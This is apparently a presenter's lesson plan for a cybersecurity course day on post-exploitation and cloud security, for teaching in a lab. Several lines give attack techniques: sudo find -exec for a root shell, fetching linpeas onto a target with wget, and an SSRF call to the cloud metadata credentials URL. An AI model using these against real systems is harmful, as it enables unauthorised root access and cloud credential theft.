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SHEET (~85 min). RUNS HOT — two disciplines (post-ex + infra/cloud) in one day. Pick your
cuts in the prep routine, on paper. Must-teach spine: priv-esc + its DO, the attack-chain
artifact, shared responsibility, the policy DO. Everything else flexes.
00:00 Journey check + hook (low-priv -&gt; root in 20s)           4
00:04 What a shell is + the post-ex goals                      5
00:09 Privilege escalation                                    10
00:19 DO: shell -&gt; linpeas -&gt; priv-esc on Metasploitable2     16
00:35 Persistence / lateral movement / pivoting                8
00:43 The attack chain + detection opportunities               7
00:50 Infrastructure security                                  8
00:58 Cloud security — shared responsibility                   8
01:06 DO: fix an open bucket / IAM policy                     10
01:16 Attack &lt;-&gt; defence + wrap + homework                     4
CUT FIRST IF SHORT: persistence/lateral/pivot slide to 4 min; infra slide to a 4-min bullet run.
NEVER CUT: privilege escalation + the priv-esc DO, the attack-chain-with-detection artifact,
shared responsibility, the bucket/IAM DO.
ANALOGY (kitchen): post-ex = you're inside after hours. Get the master key (priv-esc), prop a
door for later (persistence), move kitchen -&gt; office -&gt; safe (lateral movement), use the
restaurant's van to reach the warehouse (pivoting). Cloud = a chain of restaurants sharing one
supplier who says "we lock the building; what's in your unit is your problem".
ETHICS: Metasploitable2 / assigned lab target only (the ROE). Post-ex stays on that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Journey Check. Getting a shell is the START of the interesting part, not the end. This is
lifecycle Phase 5 (post-exploitation).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`find` can run commands (`-exec`), and `sudo` runs it as root -&gt; instant root shell. This is a
GTFOBins classic (Day 7). Land it: "the exploit got them a low-priv shell; THIS is how it
becomes game over."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Metasploit gives you a `meterpreter` session (a feature-rich agent) or a plain `shell`.
The goals list = the rest of today. "Quietly" = the whole reason Day 19 (Blue team)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Tools automate the hunt: `linpeas.sh` / `linenum.sh` (Linux), `winPEAS` / `PowerUp` (Windows).
They dump everything interesting; you spot the path. Kernel exploits are last resort (can
crash the box).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min. Metasploitable2 has many paths: the `distcc`/`udev`/`nfs` routes, an old kernel,
world-writable cron. Coach the same way as Day 15.
linpeas: `wget http://&lt;your-kali&gt;/linpeas.sh` on the target (host it with `python3 -m http.server`).
Non-root -&gt; root is the proof. This is Phase 5 of the engagement journal.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why a flat internal network is dangerous - one workstation compromise reaches the
database, the DC, everything. Segmentation (next) breaks the chain.
CUT to 4 min if behind - name the three, one line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ARTIFACT. Students draw their own version: the chain + one thing a SOC could see
at each step. It's the bridge from Red to Blue and the reason "assume breach" (Day 10)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theme: the internal network is not "trusted" just because it's internal (assume breach).
Segmentation is the single highest-value control against lateral movement.
CUT to a 4-min bullet run if behind.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split shifts by service model: with a managed database (PaaS) the provider patches the DB;
with a VM (IaaS) you do. The CONSTANT is: identity, access config, and data are always yours.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SSRF callback: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns
temporary creds for whatever role the instance has. If that role is over-privileged, the SSRF
becomes account takeover. IMDSv2 mitigates; least-privilege roles are the real fix.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min, paper exercise (no cloud account needed). If you have LocalStack / MinIO set up, do it
live against a real bucket. Answer key in teacher-notes.
The skill: reading a policy and spotting "this grants far more than the app needs".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through-line: least privilege + segmentation + monitoring. Every row is one of those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start of Day 18.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three lines. Tomorrow: the newest frontier - AI and cyber security. AI as a target, a
weapon, and a defender's tool. You'll prompt-inject a vulnerable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17 — Post-Exploitation + Infrastructure &amp; Cloud</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Created by Marp</dc:creator>
  <cp:lastModifiedBy>Created by Marp</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-06T17:16:53Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-06T17:16:53Z</dcterms:modified>
</cp:coreProperties>
</file>